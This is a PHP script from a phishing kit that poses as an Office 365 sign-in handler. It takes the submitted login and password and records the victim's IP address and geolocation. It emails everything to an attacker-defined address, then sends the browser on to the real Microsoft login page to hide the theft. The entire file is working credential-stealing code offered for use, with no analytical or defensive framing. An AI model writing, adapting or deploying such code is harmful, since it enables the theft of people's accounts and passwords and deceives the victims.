﻿<?php 
require '../forward.php';
$browser = $_SERVER['HTTP_USER_AGENT'];

require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$xemail = $_POST['login'];
$email =  bin2hex($xemail);
$from_email = "KEYWORD";
$headers = "From: " . $from_email;
$message .= "START LOG:\n";
$message .= "Office365 ID: " . $_POST['login'] . "\n"; 
$message .= "CPassword: " . $_POST['passwd'] . "\n"; 
$message .= "LOCATION (".$ip.",{$geoplugin->countryName},{$geoplugin->countryCode},{$geoplugin->city},{$geoplugin->region})\n";
$to = EMAIL; 


$hi = mail($to,$emailprovider."Office365 ".$ip , $message,$headers);
	?> 
<script type="text/javascript"> 
<!-- 
   window.location="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office365.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=a0beb799-98bf-4afa-8a6d-97fe1dcf496d&protectedtoken=true&domain_hint=wpi.edu&nonce=637248038258795830.bceb2d57-57c2-4b97-ada3-6b0dae98ea4c&state=DctLDoAgDABR0CN4DqTh17IwnqVAFyYajYnh-rJ4sxutlJqHadAwojB5dIHAk4uEOZKHtVQprkU0EaszoWQ03NibVKCxZBIOVY93sXdnu7_C57X151ilfT8"

</script> 
<?php	

  ?> 
<script type="text/javascript">

</script> 
<?php	
fclose($handle); 
exit; 
?> 